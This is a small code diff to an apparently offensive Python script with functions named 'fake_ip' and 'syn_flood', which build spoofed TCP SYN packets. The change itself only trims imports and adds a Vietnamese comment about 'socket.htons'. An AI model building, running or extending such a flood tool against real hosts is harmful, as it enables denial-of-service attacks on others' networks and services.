@@ -5,8 +5,8 @@ import requests
 from urllib.parse import urlparse
 from colorama import Fore, Style
 from socket import *
-from struct import pack, htons
-from random import randrange, choice, randint
+from struct import pack
+from random import randrange, choice
 import re
 
 def fake_ip():
@@ -86,7 +86,7 @@ def syn_flood(tgt, port, fake_ip):
             ack = 0
             psh = 0
             urg = 0
-            window = htons(5840)
+            window = htons(5840)  # Sử dụng socket.htons
             check = 0
             urg_prt = 0
 
